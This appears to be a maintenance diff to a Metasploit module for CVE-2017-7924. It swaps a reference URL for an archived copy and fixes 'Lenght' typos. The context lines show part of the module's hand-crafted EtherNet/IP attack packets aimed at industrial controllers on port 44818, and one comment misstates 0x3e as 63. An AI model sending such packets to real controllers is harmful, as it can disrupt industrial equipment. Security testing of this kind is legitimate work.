@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         [ 'CVE', '2017-7924' ],
         [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-138-03' ],
-        [ 'URL', 'https://dl.acm.org/doi/10.1145/3174776.3174780']
+        [ 'URL', 'http://web.archive.org/web/20250116210051/https://dl.acm.org/doi/10.1145/3174776.3174780']
       ])
       register_options([Opt::RPORT(44818),])
   end
@@ -45,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
   def enip_register_session_pkt
     # ENIP encapsulation Header
     "\x65\x00" + # Command register session (0x0065)
-    "\x04\x00" + # Lenght (4)
+    "\x04\x00" + # Length (4)
     "\x00\x00\x00\x00" + # Session handle (0x00000000)
     "\x00\x00\x00\x00" + # Status success (0x00000000)
     "\x00\x00\x00\x00\x00\x00\x00\x00" + # Sender context (0x0000000000000000)
@@ -58,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
   def enip_ccm_forward_open_pkt(enip_session_handle)
     # ENIP encapsulation header
     "\x6f\x00" + # Send RR data (0x006f)
-    "\x3e\x00" + # Lenght (63)
+    "\x3e\x00" + # Length (63)
     enip_session_handle + # Session handle (retrieved from register session)
     "\x00\x00\x00\x00" + # Status success (0x00000000)
     "\x00\x00\x00\x00\x00\x00\x00\x00" + # Sender context (0x0000000000000000)
